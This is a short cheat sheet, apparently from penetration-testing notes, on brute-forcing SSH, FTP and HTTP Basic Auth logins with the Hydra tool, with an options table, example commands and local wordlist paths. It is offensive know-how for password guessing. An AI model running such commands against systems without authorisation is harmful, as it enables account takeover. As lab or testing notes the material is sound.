# ssh weak pass brute forcing

<chunk>

If you don't know the username or password, you can try brute-forcing it using Hydra, a fast and flexible login cracker used to perform brute-force attacks on login services like SSH, FTP, HTTP, and more.

### Basic Syntax
```bash
hydra [OPTIONS] TARGET SERVICE
```
---

### Common Options

| Option              | Description                              |
| ------------------- | ---------------------------------------- |
| `-l <username>`     | Single username                          |
| `-L <userlist.txt>` | File with list of usernames              |
| `-p <password>`     | Single password                          |
| `-P <passlist.txt>` | File with list of passwords              |
| `-t <number>`       | Number of parallel tasks (default is 16) |
| `-f`                | Exit after first valid login             |
| `-o <file>`         | Output results to a file                 |

---

### Example Commands

**1. Brute-force SSH login:**

```bash
hydra -l admin -P passwords.txt ssh://192.168.1.100
```

**2. Brute-force FTP using a username list:**

```bash
hydra -L users.txt -P passwords.txt ftp://example.com
```

**3. Brute-force HTTP Basic Auth:**

```bash
hydra -L users.txt -P passwords.txt http-basic://example.com/
```
- Currently
    - the File with list of passwords are stored in /usr/share/wordlists/rockyou.txt
    - the File with list of username are stored in /usr/share/wordlists/metasploit/unix_users.txt

</chunk>